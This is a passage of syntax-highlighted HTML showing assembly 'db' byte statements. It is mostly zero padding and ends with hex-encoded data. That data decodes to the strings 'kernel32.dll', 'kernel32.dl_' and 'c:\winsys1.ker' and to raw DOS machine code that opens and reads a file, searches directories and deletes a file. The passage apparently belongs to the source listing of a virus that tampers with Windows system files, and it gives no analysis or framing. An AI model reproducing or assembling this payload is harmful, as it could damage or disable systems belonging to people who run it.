      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">6bh</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc4">,</span><span class="sc2">6eh</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc2">6ch</span><span class="sc4">,</span><span class="sc2">33h</span><span class="sc4">,</span><span class="sc2">32h</span><span class="sc4">,</span><span class="sc2">2eh</span><span class="sc4">,</span><span class="sc2">64h</span><span class="sc4">,</span><span class="sc2">6ch</span><span class="sc4">,</span><span class="sc2">6ch</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">6bh</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc4">,</span><span class="sc2">6eh</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc2">6ch</span><span class="sc4">,</span><span class="sc2">33h</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">32h</span><span class="sc4">,</span><span class="sc2">2eh</span><span class="sc4">,</span><span class="sc2">64h</span><span class="sc4">,</span><span class="sc2">6ch</span><span class="sc4">,</span><span class="sc2">5fh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">63h</span><span class="sc4">,</span><span class="sc2">3ah</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">5ch</span><span class="sc4">,</span><span class="sc2">77h</span><span class="sc4">,</span><span class="sc2">69h</span><span class="sc4">,</span><span class="sc2">6eh</span><span class="sc4">,</span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc2">79h</span><span class="sc4">,</span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc2">31h</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2eh</span><span class="sc4">,</span><span class="sc2">6bh</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc4">,</span><span class="sc2">8h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">8eh</span><span class="sc4">,</span><span class="sc2">0d8h</span><span class="sc4">,</span><span class="sc2">8eh</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2h</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc4">,</span><span class="sc2">0bah</span><span class="sc4">,</span><span class="sc2">7eh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc2">8bh</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0d8h</span><span class="sc4">,</span><span class="sc2">33h</span><span class="sc4">,</span><span class="sc2">0f6h</span><span class="sc4">,</span><span class="sc2">0b4h</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc4">,</span><span class="sc2">0b9h</span><span class="sc4">,</span><span class="sc2">64h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc2">0b4h</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc4">,</span><span class="sc2">0cdh</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc2">0b4h</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">0bah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b4h</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc4">,</span><span class="sc2">0bah</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">33h</span><span class="sc4">,</span><span class="sc2">0c9h</span><span class="sc4">,</span><span class="sc2">0cdh</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc4">,</span><span class="sc2">0bah</span><span class="sc4">,</span><span class="sc2">64h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0b4h</span><span class="sc4">,</span><span class="sc2">041h</span><span class="sc0">
